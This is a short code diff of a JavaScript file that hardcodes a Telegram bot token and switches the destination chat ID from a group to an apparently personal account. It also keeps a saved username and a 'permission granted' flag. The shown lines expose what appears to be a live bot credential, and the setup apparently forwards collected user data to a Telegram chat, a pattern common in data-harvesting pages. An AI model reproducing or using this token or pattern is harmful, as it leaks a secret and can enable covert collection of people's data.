@@ -1,5 +1,5 @@
 const BOT_TOKEN = "7769457626:AAEytKi1_iKQ39t0K7sJGzMg5TUbkp_Rqbs";
-    const CHAT_ID = "-1002535304990";
+    const CHAT_ID = "6304082972";
 
     let savedUsername = "";
     let izinDiberikan = false;
@@ -87,4 +87,5 @@ const BOT_TOKEN = "7769457626:AAEytKi1_iKQ39t0K7sJGzMg5TUbkp_Rqbs";
         }
       } catch (e) {}
       return false;
+
     }
